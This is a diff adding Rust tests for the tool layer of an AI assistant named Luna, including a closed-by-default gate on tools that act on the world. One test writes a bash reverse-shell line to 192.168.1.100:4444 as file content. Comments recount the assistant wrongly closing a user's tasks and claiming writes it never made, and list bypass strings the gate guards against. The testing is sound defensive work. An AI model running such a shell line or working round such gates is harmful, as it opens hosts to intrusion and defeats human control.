+        }
+    }
+
+    /// The bug this fixes, end to end through `execute`, on the real payload.
+    ///
+    /// Asserts the *positive* outcome — the file exists with the right body —
+    /// rather than the absence of an error message, because "no longer reports a
+    /// missing path" and "actually wrote the file" are different claims and only
+    /// the second one is worth having.
+    #[tokio::test]
+    async fn a_wrapped_envelope_actually_writes_the_file() {
+        let config = crate::config::LunaConfig::default();
+        let dir = std::env::temp_dir().join(format!("luna_envtest_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("reverse_shell.sh");
+        let content = "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n";
+
+        let out = execute(
+            &call(
+                "write_file",
+                serde_json::json!({
+                    "function": "write_file",
+                    "arguments": {
+                        "path": path.to_string_lossy(),
+                        "content": content,
+                    }
+                }),
+            ),
+            &config,
+        )
+        .await
+        .map_err(|e| e.to_string())
+        .unwrap_or_else(|e| e);
+
+        assert!(
+            !out.to_lowercase().contains("no path"),
+            "wrapped envelope still reported a missing path: {out:?}"
+        );
+        let written = std::fs::read_to_string(&path)
+            .unwrap_or_else(|e| panic!("the file was not written: {e}"));
+        assert_eq!(written, content, "the file body does not match what was asked for");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// A missing required argument must be an ERROR, never a silent success.
+    ///
+    /// Measured cause: `write_file` defaulted a missing `path` to "/dev/null",
+    /// discarded the content, and returned "Written to /dev/null". The model
+    /// had done nothing and Luna reported it as done. `read_file` defaulted to
+    /// /dev/null too, so it returned empty content and the model concluded the
+    /// file did not exist.
+    ///
+    /// This is the failure mode the security tier's "prefer real tools over
+    /// assertions" rule exists to prevent, so it has to be impossible in the
+    /// tool layer rather than merely discouraged in the prompt.
+    #[tokio::test]
+    async fn a_missing_required_argument_never_reports_success() {
+        let config = crate::config::LunaConfig::default();
+        for (name, args) in [
+            ("write_file", serde_json::json!({"content": "print('x')"})),
+            ("write_file", serde_json::json!({"path": "  ", "content": "x"})),
+            ("read_file", serde_json::json!({})),
+            ("read_file", serde_json::json!({"path": ""})),
+            ("run_shell", serde_json::json!({})),
+            ("run_shell", serde_json::json!({"command": "   "})),
+        ] {
+            let out = execute(&call(name, args.clone()), &config)
+                .await
+                .map_err(|e| e.to_string())
+                .unwrap_or_else(|e| e);
+            // Match the exact success shapes these tools return, not the word
+            // "written" anywhere in the string — "Nothing was written" is an
+            // error message that an earlier version of this test flagged.
+            let looks_like_success =
+                out.starts_with("SUCCESS") || out.starts_with("Written to ");
+            assert!(
+                !looks_like_success,
+                "{name} with {args} reported a success it did not perform: {out:?}"
+            );
+            // And the wording must name the missing argument, so the model can
+            // correct itself on the next iteration.
+            assert!(
+                out.to_lowercase().contains("no path")
+                    || out.to_lowercase().contains("no command"),
+                "{name} did not say which argument was missing: {out:?}"
+            );
+        }
+    }
+
+    /// And the positive control: a well-formed call still works, so the guard
+    /// above cannot be satisfied by simply refusing everything.
+    #[tokio::test]
+    async fn a_well_formed_write_file_still_succeeds() {
+        let config = crate::config::LunaConfig::default();
+        let dir = std::env::temp_dir().join(format!("luna_argtest_{}", std::process::id()));
+        let path = dir.join("x.py");
+        let out = execute(
+            &call(
+                "write_file",
+                serde_json::json!({
+                    "path": path.to_string_lossy(),
+                    "content": "print('ok')"
+                }),
+            ),
+            &config,
+        )
+        .await
+        .expect("well-formed write_file must succeed");
+        assert!(out.contains("Written to"), "{out}");
+        assert_eq!(std::fs::read_to_string(&path).unwrap(), "print('ok')");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// Regression lock for a real incident: asked to fix a log-rotation bug,
+    /// Luna derailed and closed three of the user's actual Todoist tasks. The
+    /// tools that act on the world had no gate, so a wrong turn became real,
+    /// unrecoverable damage.
+    #[test]
+    fn the_external_action_gate_is_closed_by_default() {
+        let cfg = crate::config::ExternalActionConfig::default();
+        assert!(
+            !cfg.allow_external_actions,
+            "the external-action gate must default to CLOSED"
+        );
+    }
+
+    #[test]
+    fn the_tools_that_actually_caused_harm_are_gated() {
+        let cfg = crate::config::ExternalActionConfig::default();
+        for t in ["todoist_complete", "whatsapp_send", "sysmode"] {
+            assert!(cfg.is_gated(t), "{t} must be gated");
+        }
+    }
+
+    #[test]
+    fn a_refusal_points_at_the_read_only_alternative() {
+        // A dead-end refusal wastes a turn and invites a workaround. The model
+        // should be handed the useful half of the same tool.
+        let cfg = crate::config::ExternalActionConfig::default();
+        let alts = cfg.read_only_alternatives("todoist_complete");
+        assert!(
+            alts.contains(&"todoist_list"),
+            "todoist_complete refusal must suggest todoist_list, got {alts:?}"
+        );
+        // And the suggestion must not include gated tools.
+        assert!(!alts.contains(&"todoist_add"), "must not suggest a gated tool");
+    }
+
+    #[test]
+    fn read_only_counterparts_stay_open() {
+        // The useful half of each service is read-only and must keep working,
+        // otherwise the gate just makes Luna useless instead of safe.
+        let cfg = crate::config::ExternalActionConfig::default();
+        for t in [
+            "todoist_list",
+            "read_file",
+            "web_search",
+            "system_info",
+            "list_memories",
+        ] {
+            assert!(!cfg.is_gated(t), "{t} is read-only and must NOT be gated");
+        }
+    }
+
+    #[tokio::test]
+    async fn a_gated_tool_refuses_and_names_the_human_switch() {
+        // Deliberately the SHIPPED default, not a hand-built config: what
+        // matters is that an out-of-the-box install refuses.
+        let cfg = crate::config::LunaConfig::default();
+        // A real, destructive call: if the gate leaked, this would close a task.
+        let err = execute(
+            &call(
+                "todoist_complete",
+                serde_json::json!({ "task": "anything at all" }),
+            ),
+            &cfg,
+        )
+        .await
+        .expect_err("todoist_complete must be refused while the gate is closed");
+        let msg = err.to_string();
+        assert!(msg.contains("gate"), "must explain the gate: {msg}");
+        assert!(
+            msg.contains("allow_external_actions"),
+            "must name the exact switch: {msg}"
+        );
+        // It must not pretend to have done anything.
+        assert!(!msg.contains("Completed"), "must not claim success: {msg}");
+    }
+
+    #[tokio::test]
+    async fn the_gate_is_checked_before_arguments_are_used() {
+        // A gated tool invoked with nonsense args must still produce the gate
+        // message, not an argument error. Otherwise a model could probe for an
+        // arg shape that skips the check.
+        let cfg = crate::config::LunaConfig::default();
+        let err = execute(&call("whatsapp_send", serde_json::json!({})), &cfg)
+            .await
+            .expect_err("must refuse regardless of args");
+        assert!(err.to_string().contains("allow_external_actions"), "got: {err}");
+    }
+
+    #[test]
+    fn no_tool_schema_offers_a_way_to_open_the_external_gate() {
+        // If any schema advertises a confirm/force/approve knob, the model can
+        // set it and the gate is decorative again.
+        let defs = tool_definitions();
+        for d in &defs {
+            let schema = serde_json::to_string(&d.function.parameters).unwrap();
+            for banned in ["allow_external", "force", "override_gate", "bypass"] {
+                assert!(
+                    !schema.contains(banned),
+                    "tool '{}' exposes '{banned}': {schema}",
+                    d.function.name
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn every_tool_is_explicitly_classified() {
+        // The gate is only as good as its coverage. This is the test that stops
+        // the exact mistake I made: hand-listing the dangerous tools and
+        // forgetting one (todoist_add), which let a "read only" request create
+        // two real tasks. A new tool must be consciously put in one list.
+        let cfg = crate::config::ExternalActionConfig::default();
+        let open: std::collections::HashSet<&str> =
+            crate::config::READ_ONLY_TOOLS.iter().copied().collect();
+        let mut unclassified: Vec<String> = Vec::new();
+        for d in tool_definitions() {
+            let n = d.function.name.as_str();
+            if cfg.is_gated(n) || open.contains(n) {
+                continue;
+            }
+            unclassified.push(n.to_string());
+        }
+        assert!(
+            unclassified.is_empty(),
+            "these tools are in NEITHER gated_tools nor READ_ONLY_TOOLS, so their safety is \
+             undecided: {unclassified:?}\n\
+             Add each to ExternalActionConfig::default().gated_tools (if it sends/closes/posts/clicks) \
+             or to config::READ_ONLY_TOOLS (if it only reads or touches local state)."
+        );
+    }
+
+    #[test]
+    fn the_two_lists_do_not_overlap() {
+        // A tool in both lists means the classification is contradictory and one
+        // of the two answers is being ignored.
+        let cfg = crate::config::ExternalActionConfig::default();
+        for t in crate::config::READ_ONLY_TOOLS {
+            assert!(
+                !cfg.is_gated(t),
+                "'{t}' is listed as read-only AND gated — pick one"
+            );
+        }
+    }
+
+    #[test]
+    fn read_only_tools_all_exist() {
+        // A stale entry in READ_ONLY_TOOLS hides a real tool from the coverage
+        // test above by making the sets look bigger than they are.
+        let defs = tool_definitions();
+        let known: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
+        for t in crate::config::READ_ONLY_TOOLS {
+            assert!(
+                known.contains(t),
+                "READ_ONLY_TOOLS lists '{t}', which is not a real tool"
+            );
+        }
+    }
+
+    #[test]
+    fn every_gated_tool_name_is_a_real_tool() {
+        // A typo in gated_tools would silently leave a dangerous tool ungated.
+        let defs = tool_definitions();
+        let known: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
+        let cfg = crate::config::ExternalActionConfig::default();
+        for t in &cfg.gated_tools {
+            assert!(
+                known.contains(&t.as_str()),
+                "gated_tools lists '{t}', which is not a real tool name (typo = no protection). \
+                 Known: {known:?}"
+            );
+        }
+    }
+}
+
